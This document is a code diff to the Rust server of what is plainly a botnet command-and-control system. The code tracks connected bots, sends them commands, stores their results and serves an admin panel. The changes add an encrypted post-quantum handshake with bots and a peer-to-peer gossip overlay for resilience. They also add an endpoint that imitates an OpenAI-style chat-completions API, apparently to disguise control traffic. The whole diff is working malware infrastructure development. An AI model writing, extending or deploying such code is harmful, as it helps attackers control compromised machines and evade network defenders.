@@ -1,7 +1,12 @@
+#![forbid(unsafe_code)]
+
 mod commands;
 mod config;
+mod crypto;
 mod encryption;
 mod error;
+mod p2p;
+mod agentic;
 mod persistence;
 
 use std::collections::HashMap;
@@ -23,8 +28,6 @@ use serde::{Deserialize, Serialize};
 use tokio::net::TcpListener;
 use tokio::sync::{mpsc, RwLock};
 
-// --- Shared state ---
-
 pub struct AppState {
     bots: RwLock<HashMap<SocketAddr, BotHandle>>,
     results: RwLock<Vec<ResultEntry>>,
@@ -43,8 +46,6 @@ struct ResultEntry {
     result: String,
     timestamp: Instant,
 }
-
-// --- API types ---
 
 #[derive(Serialize)]
 struct BotInfo {
@@ -66,8 +67,6 @@ struct CommandRequest {
     command: String,
     args: Vec<String>,
 }
-
-// --- Admin panel handlers ---
 
 async fn admin_page() -> Html<&'static str> {
     Html(include_str!("admin.html"))
@@ -112,13 +111,20 @@ async fn get_results(State(state): State<Arc<AppState>>) -> Json<Vec<ResultInfo>
     Json(infos)
 }
 
-// --- Bot connection handler ---
-
 async fn handle_bot(
     mut socket: tokio::net::TcpStream,
     addr: SocketAddr,
     state: Arc<AppState>,
 ) {
+    let handshake = match crypto::handshake::server_handshake(&mut socket).await {
+        Ok(h) => h,
+        Err(e) => {
+            eprintln!("[!] Handshake failed with {}: {}", addr, e);
+            return;
+        }
+    };
+    let key = handshake.session_key;
+
     let (tx, mut rx) = mpsc::channel::<Command>(32);
 
     state.bots.write().await.insert(addr, BotHandle {
@@ -127,9 +133,7 @@ async fn handle_bot(
         command_tx: tx,
     });
 
-    eprintln!("[+] Bot connected: {}", addr);
-
-    let key = state.config.settings.encryption_key.as_bytes();
+    eprintln!("[+] Bot connected (PQ session): {}", addr);
 
     loop {
         match rx.recv().await {
@@ -139,11 +143,11 @@ async fn handle_bot(
                     Err(_) => continue,
                 };
 
-                if encryption::send_encrypted(&mut socket, &json, key).await.is_err() {
+                if encryption::send_encrypted(&mut socket, &json, &key).await.is_err() {
                     break;
                 }
 
-                match encryption::recv_encrypted(&mut socket, key).await {
+                match encryption::recv_encrypted(&mut socket, &key).await {
                     Ok(data) => {
                         if let Ok(result) = serde_json::from_slice::<CommandResult>(&data) {
                             state.results.write().await.push(ResultEntry {
@@ -165,8 +169,6 @@ async fn handle_bot(
     eprintln!("[-] Bot disconnected: {}", addr);
 }
 
-// --- Entry point ---
-
 #[tokio::main]
 async fn main() -> Result<(), C2Error> {
     let config = Config::load();
@@ -176,13 +178,46 @@ async fn main() -> Result<(), C2Error> {
     let tcp_addr = config.settings.tcp_address.clone();
     let admin_addr = config.settings.admin_address.clone();
 
+    if config.p2p.enabled {
+        let gossip_addr: SocketAddr = config.p2p.gossip_address.parse()
+            .expect("Invalid P2P gossip address");
+        let bootstrap: Vec<SocketAddr> = config.p2p.bootstrap_peers.iter()
+            .filter_map(|s| s.parse().ok())
+            .collect();
+        let overlay = Arc::new(
+            p2p::overlay::Overlay::new(gossip_addr, bootstrap, config.p2p.max_peers)
+        );
+        let gossip = Arc::new(
+            p2p::gossip::GossipEngine::new(gossip_addr, overlay)
+                .await
+                .map_err(|e| C2Error::P2pError(e.to_string()))?
+        );
+        gossip.start();
+        eprintln!("[*] P2P gossip: {}", config.p2p.gossip_address);
+    }
+
+    if config.agentic.enabled {
+        let agentic_state = Arc::new(
+            agentic::transport::AgenticState::new(config.agentic.api_keys.clone())
+        );
+        let agentic_app = Router::new()
+            .route("/v1/chat/completions", post(agentic::transport::handle_chat_completion))
+            .route("/v1/models", get(agentic::transport::handle_models_list))
+            .with_state(agentic_state);
+        let listen_addr = config.agentic.listen_address.clone();
+        tokio::spawn(async move {
+            let listener = TcpListener::bind(&listen_addr).await.unwrap();
+            eprintln!("[*] Agentic API: {}", listen_addr);
+            axum::serve(listener, agentic_app).await.unwrap();
+        });
+    }
+
     let state = Arc::new(AppState {
         bots: RwLock::new(HashMap::new()),
         results: RwLock::new(Vec::new()),
         config,
     });
 
-    // Spawn admin panel HTTP server
     let admin_state = state.clone();
     tokio::spawn(async move {
         let app = Router::new()
@@ -197,7 +232,6 @@ async fn main() -> Result<(), C2Error> {
         axum::serve(listener, app).await.unwrap();
     });
 
-    // Start TCP listener for bot connections
     let listener = TcpListener::bind(&tcp_addr)
         .await
         .map_err(|e| C2Error::NetworkError(e.to_string()))?;
